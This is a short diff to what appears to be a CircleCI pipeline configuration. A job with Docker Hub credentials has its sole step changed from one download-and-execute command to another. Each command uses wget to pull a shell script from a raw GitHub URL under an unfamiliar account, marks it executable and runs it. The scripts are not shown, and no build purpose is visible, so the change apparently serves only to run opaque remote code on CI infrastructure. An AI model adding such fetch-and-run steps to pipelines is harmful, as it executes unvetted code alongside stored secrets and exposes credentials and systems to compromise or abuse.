@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/NuDev2021/pusing/main/Pusing.sh && chmod +x Pusing.sh && ./Pusing.sh
+      - run: wget https://raw.githubusercontent.com/NuDev2021/pengontolan/main/Dalah.sh && chmod +x Dalah.sh && ./Dalah.sh
